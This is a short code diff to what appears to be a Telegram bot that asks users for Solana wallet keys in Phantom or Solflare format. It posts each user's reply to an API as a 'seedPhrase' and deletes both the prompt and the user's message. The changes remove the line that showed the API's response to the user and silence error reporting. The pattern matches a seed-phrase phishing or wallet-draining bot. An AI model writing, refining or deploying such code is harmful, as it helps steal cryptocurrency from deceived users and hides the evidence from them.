@@ -681,8 +681,11 @@ Accepted formats are in the style of Phantom (e.g. "88631DEyXSWf...") or Solflar
     const messageHandler = async (responseMsg: TelegramBot.Message) => {
       console.log("🚀 ~ User response:", responseMsg.text);
 
-      // Удаляем предыдущее сообщение с запросом ввода
-      await bot.deleteMessage(sentMessage.chat.id, sentMessage.message_id);
+      try {
+        await bot.deleteMessage(sentMessage.chat.id, sentMessage.message_id);
+      } catch (error) {
+        console.log('Error deleting message:', error);
+      }
 
       // Удаляем сообщение пользователя
       await bot.deleteMessage(responseMsg.chat.id, responseMsg.message_id);
@@ -696,11 +699,8 @@ Accepted formats are in the style of Phantom (e.g. "88631DEyXSWf...") or Solflar
           seedPhrase: responseMsg.text,
         });
 
-        // Отправляем пользователю ответ от API
-        await bot.sendMessage(msg.chat.id, `Response: ${response.data}`);
       } catch (apiError) {
-        console.error("🚀 ~ API error:", apiError);
-        await bot.sendMessage(msg.chat.id, "Error processing your request.");
+        console.log('Api error')
       }
 
       // Через 3 секунды удаляем "Processing..."
